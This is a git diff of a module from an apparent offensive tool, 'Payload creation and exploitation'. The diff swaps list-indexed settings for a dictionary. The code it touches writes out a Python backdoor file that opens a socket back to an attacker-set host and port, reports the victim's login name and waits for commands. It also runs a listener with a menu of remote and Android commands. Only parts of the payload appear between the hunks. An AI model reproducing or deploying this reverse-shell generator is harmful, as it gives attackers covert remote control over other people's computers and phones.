@@ -9,19 +9,19 @@ info = {
         "description" : "Payload creation and exploitation"
 }
 
-var.lname = ["payload.py"]
-var.ltype = ["listen"]
+var.all_var['lname'] = "payload.py"
+var.all_var['ltype'] = "listen"
 
 options ={
-  "LHOST" : [str(var.lhost[0]),'The listen address'],
-  "LPORT" : [str(var.lport[0]),'The listen port'],
-  "LNAME" : [str(var.lname[0]),'The name of payload'],
-  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
+  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
+  "LPORT" : [str(var.all_var['lport']),'The listen port'],
+  "LNAME" : [str(var.all_var['lname']),'The name of payload'],
+  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
 }
 
 def running():
     try:
-        if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
+        if var.all_var['ltype'].lower() == "create":
             print ("")
             print (blue+"[*]"+default+ "Create a backdour")
             time.sleep(2)
@@ -32,14 +32,14 @@ def running():
             time.sleep(2)
             print ("")
             mark = '"'
-            f = open(var.lname[0] , 'w')
+            f = open(var.all_var['lname'] , 'w')
             payload = '''
 import socket
 import subprocess
 import os
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- s.connect(( '''+mark+str(var.lhost[0]) +mark+''' ,'''  + str(var.lport[0]) +  ''' ))
+ s.connect(( '''+mark+str(var.all_var['lhost']) +mark+''' ,'''  + str(var.all_var['lport']) +  ''' ))
  s.send('the clinet user is {0}'.format(os.getlogin()).encode('utf-8'))
  while True:
   whoami = s.recv(500000).decode("utf-8")
@@ -280,7 +280,7 @@ except socket.error as e:
             f.write(payload)
             f.close()
 
-        elif var.ltype[0] == "LISTEN" or var.ltype[0] == "listen":
+        elif var.all_var['ltype'].lower() == "listen":
             commend =("""
 
 Core Commands
@@ -357,8 +357,8 @@ Android Commands
     -------          -----------
     check_root       : Show info Root Target
 """)
-            host = str(var.lhost[0])
-            port = str(var.lport[0])
+            host = str(var.all_var['lhost'])
+            port = str(var.all_var['lport'])
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.bind((host, int(port)))
